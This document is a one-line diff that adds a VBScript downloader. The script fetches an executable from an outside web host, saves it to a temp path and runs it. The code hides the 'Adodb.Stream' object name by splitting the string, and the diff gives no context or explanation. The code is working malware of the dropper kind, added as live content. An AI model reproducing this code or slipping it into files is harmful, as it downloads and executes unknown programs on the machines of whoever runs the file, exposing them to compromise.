@@ -1,0 +1,1 @@
+Set Post=CreateObject("Msxml2.XMLHTTP"):Set Shell=CreateObject("Wscript.Shell"):a5="http://admin.www-w3.com/test/cs.exe":a4="C:\temp1.exe":a3="GET":Post.Open a3,a5,0:Post.Send():a1="Adodb.":a2="Stream":str1=a1&a2:Set aGet=CreateObject(str1):aGet.Mode=3:aGet.Type=1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile a4,2:wscript.sleep 10000:Shell.Run (a4)
